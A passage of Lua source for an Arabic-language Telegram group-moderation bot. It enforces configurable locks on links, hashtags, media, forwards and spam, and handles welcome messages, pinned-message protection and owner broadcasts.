Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Vips(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Vips(msg) then
if redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessagePhoto" and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:Photo"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Photo"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Photo"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Photo"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVideo" and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:Video"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Video"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Video"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Video"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAnimation" and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:Animation"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Animation"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Animation"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Animation"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:geam"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:geam"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:geam"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:geam"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAudio" and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:Audio"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Audio"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Audio"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Audio"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVoice" and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:vico"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:vico"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:vico"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:vico"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:Keyboard"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Keyboard"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Keyboard"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Keyboard"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageSticker" and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:Sticker"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Sticker"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Sticker"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Sticker"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:forward"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Status:Lock:forward"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Status:Lock:forward"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Status:Lock:forward"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageDocument" and not Vips(msg) then     
if redis:get(bot_id.."Status:Lock:Document"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Document"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Document"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Document"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Vips(msg) then      
if redis:get(bot_id.."Status:Lock:Unsupported"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Unsupported"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Unsupported"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Unsupported"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Vips(msg) then
if redis:get(bot_id.."Status:Lock:Markdaun"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Markdaun"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Markdaun"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Markdaun"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 

if tonumber(msg.via_bot_user_id_) ~= 0 and not Vips(msg) then
if redis:get(bot_id.."Status:Lock:Inlen"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Inlen"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Inlen"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Inlen"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageContact" and not Vips(msg) then      
if redis:get(bot_id.."Status:Lock:Contact"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Contact"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Contact"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Contact"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Vips(msg) then  
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400  
if redis:get(bot_id.."Status:Lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
local status_welcome = redis:get(bot_id.."Chek:Welcome"..msg.chat_id_)
if status_welcome and not redis:get(bot_id.."Status:Lock:tagservr"..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = redis:get(bot_id.."Get:Welcome:Group"..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = "\n• نورت حبي \n•  name \n• user" 
end 
t = t:gsub("name",result.first_name_) 
t = t:gsub("user",("@"..result.username_ or "لا يوجد")) 
send(msg.chat_id_, msg.id_,t)
end,nil) 
end 
end 
-------------------------------------------------------
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(bot_id) then 
redis:set(bot_id.."Get:Id:Msg:Pin"..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = redis:get(bot_id.."Get:Id:Msg:Pin"..msg.chat_id_)
if Msg_Pin and redis:get(bot_id.."Status:lockpin"..msg.chat_id_) then
Pin_Message(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if not Vips(msg) and msg.content_.ID ~= "MessageChatAddMembers" and redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= bot_id then
floods = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(redis:get(bot_id.."Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
redis:setex(bot_id.."Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if redis:get(bot_id.."Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"⚠┇عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
redis:del(bot_id.."Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"⚠┇ليس لدي صلاحية تغيير معلومات المجموعه يرجى المحاوله لاحقا") 
redis:del(bot_id.."Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,"🎇┇تم تغيير صورة المجموعه") 
end
end, nil) 
redis:del(bot_id.."Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
end   
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
print(text)
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء الاذاعه للمجموعات") 
redis:del(bot_id.."Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id.."ChekBotAdd") 
send(msg.chat_id_, msg.id_,"☑┇تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
redis:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
redis:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
redis:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
redis:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
redis:del(bot_id.."Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء الاذاعه خاص") 
redis:del(bot_id.."Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id..'Num:User:Pv')  
send(msg.chat_id_, msg.id_,"☑┇تمت الاذاعه الى *- "..#list.." * مشترك في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
redis:del(bot_id.."Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء الاذاعه للمجموعات") 
redis:del(bot_id.."Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id.."ChekBotAdd") 
send(msg.chat_id_, msg.id_,"☑┇تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
redis:del(bot_id.."Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء الاذاعه بالتوجيه للمجموعات") 
redis:del(bot_id.."Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
